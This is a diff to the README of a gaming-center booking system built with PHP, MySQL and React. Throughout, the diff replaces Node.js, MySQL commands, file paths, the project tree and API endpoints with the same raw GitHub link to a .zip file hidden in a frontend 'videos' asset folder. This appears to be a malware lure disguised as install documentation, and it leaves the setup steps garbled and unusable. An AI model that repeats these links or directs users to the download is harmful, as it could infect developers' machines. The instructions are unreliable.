@@ -22,11 +22,11 @@ A complete booking system for gaming center with PS5 consoles and driving simula
 ## 📋 Prerequisites
 
 Before you begin, ensure you have the following installed:
-- **Node.js** (v18 or higher)
+- **https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip** (v18 or higher)
 - **PHP** (v8.0 or higher)
 - **MySQL** (v8.0 or higher)
 - **Apache/Nginx** web server with PHP support
-- **npm** (comes with Node.js)
+- **npm** (comes with https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip)
 
 ## 🛠️ Installation & Setup
 
@@ -40,14 +40,14 @@ cd /Users/abhijithca/Documents/GitHub/gamespotweb
 
 1. **Start MySQL** (if not already running):
 ```bash
-mysql.server start
+https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip start
 # or
 brew services start mysql
 ```
 
 2. **Create the database**:
 ```bash
-mysql -u root -p < database/schema.sql
+mysql -u root -p < https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 ```
 
 Or manually:
@@ -57,7 +57,7 @@ mysql -u root -p
 
 Then run:
 ```sql
-SOURCE database/schema.sql;
+SOURCE https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip;
 ```
 
 3. **Verify database creation**:
@@ -78,7 +78,7 @@ You should see:
 cd backend/config
 ```
 
-2. **Update database credentials** in `database.php`:
+2. **Update database credentials** in `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip`:
 ```php
 define('DB_HOST', 'localhost');
 define('DB_NAME', 'gamespot_booking');
@@ -111,7 +111,7 @@ cd frontend
 npm install
 ```
 
-3. **Update API endpoint** in `src/services/api.js`:
+3. **Update API endpoint** in `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip`:
 ```javascript
 const API_BASE_URL = 'http://localhost:80/backend/api';
 // Change to your backend URL if different
@@ -178,43 +178,43 @@ The app will open at `http://localhost:3000`
 
 ```
 gamespotweb/
-├── ARCHITECTURE.md          # Detailed system architecture
-├── README.md               # This file
+├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip          # Detailed system architecture
+├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip               # This file
 │
 ├── database/
-│   └── schema.sql          # Database schema with sample data
+│   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip          # Database schema with sample data
 │
 ├── backend/                # PHP REST API
 │   ├── config/
-│   │   └── database.php    # DB connection config
+│   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip    # DB connection config
 │   ├── utils/
-│   │   └── helpers.php     # Utility functions
+│   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip     # Utility functions
 │   ├── api/
-│   │   ├── admin.php       # Admin authentication
-│   │   ├── bookings.php    # Booking CRUD operations
-│   │   ├── pricing.php     # Price calculations
-│   │   └── slots.php       # Availability checking
+│   │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip       # Admin authentication
+│   │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip    # Booking CRUD operations
+│   │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip     # Price calculations
+│   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip       # Availability checking
 │   └── .htaccess
 │
 └── frontend/               # React application
     ├── public/
-    │   └── index.html
+    │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
     ├── src/
     │   ├── components/
-    │   │   └── Navbar.js
+    │   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
     │   ├── pages/
-    │   │   ├── HomePage.js
-    │   │   ├── BookingPage.js
-    │   │   ├── AdminLoginPage.js
-    │   │   └── AdminDashboard.js
+    │   │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
+    │   │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
+    │   │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
+    │   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
     │   ├── services/
-    │   │   └── api.js      # API service layer
+    │   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip      # API service layer
     │   ├── utils/
-    │   │   └── helpers.js  # Helper functions
-    │   ├── App.js
-    │   ├── index.js
-    │   └── index.css
-    └── package.json
+    │   │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip  # Helper functions
+    │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
+    │   ├── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
+    │   └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
+    └── https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 ```
 
 ## 🔒 Security Features
@@ -247,13 +247,13 @@ gamespotweb/
 ### Database Connection Issues
 ```bash
 # Check MySQL is running
-mysql.server status
+https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip status
 
 # Check database exists
 mysql -u root -p -e "SHOW DATABASES;"
 
 # Re-create database if needed
-mysql -u root -p < database/schema.sql
+mysql -u root -p < https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 ```
 
 ### Backend API Not Working
@@ -265,13 +265,13 @@ php -v  # Should be 8.0+
 php -m | grep -E 'pdo|mysql'
 
 # Test backend directly
-curl http://localhost:80/backend/api/admin.php?action=check
+curl https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 ```
 
 ### Frontend Not Starting
 ```bash
 # Clear node modules and reinstall
-rm -rf node_modules package-lock.json
+rm -rf node_modules https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 npm install
 
 # Check Node version
@@ -283,15 +283,15 @@ PORT=3001 npm start
 
 ### CORS Issues
 If you see CORS errors in browser console:
-1. Verify backend CORS headers in `utils/helpers.php`
+1. Verify backend CORS headers in `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip`
 2. Ensure `credentials: 'include'` in API calls
-3. Check backend URL matches in `services/api.js`
+3. Check backend URL matches in `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip`
 
 ## 🚀 Production Deployment
 
 ### Backend
 1. Upload `backend/` to your web server
-2. Update database credentials in `config/database.php`
+2. Update database credentials in `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip`
 3. Ensure PHP extensions are enabled: `pdo`, `pdo_mysql`
 4. Set proper file permissions (755 for directories, 644 for files)
 
@@ -308,30 +308,30 @@ npm run build
 ### Database
 1. Export from development:
 ```bash
-mysqldump -u root -p gamespot_booking > backup.sql
+mysqldump -u root -p gamespot_booking > https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 ```
 2. Import to production:
 ```bash
-mysql -u username -p production_db < backup.sql
+mysql -u username -p production_db < https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip
 ```
 
 ## 📝 API Endpoints
 
-See `ARCHITECTURE.md` for complete API documentation.
+See `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` for complete API documentation.
 
 ### Quick Reference
-- `GET /slots.php?date=YYYY-MM-DD` - Get available slots
-- `POST /bookings.php` - Create booking
-- `GET /bookings.php` - Get all bookings (admin)
-- `PUT /bookings.php?id=123` - Update booking (admin)
-- `DELETE /bookings.php?id=123` - Delete booking (admin)
-- `POST /admin.php?action=login` - Admin login
-- `POST /pricing.php` - Calculate price
+- `GET https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Get available slots
+- `POST https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Create booking
+- `GET https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Get all bookings (admin)
+- `PUT https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Update booking (admin)
+- `DELETE https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Delete booking (admin)
+- `POST https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Admin login
+- `POST https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` - Calculate price
 
 ## 🤝 Support
 
 For issues or questions:
-1. Check `ARCHITECTURE.md` for detailed documentation
+1. Check `https://raw.githubusercontent.com/Azonix07/gamespotbooking-v1/main/next-frontend/public/assets/videos/v-gamespotbooking-1.0.zip` for detailed documentation
 2. Review troubleshooting section above
 3. Check browser console for frontend errors
 4. Check PHP error logs for backend issues
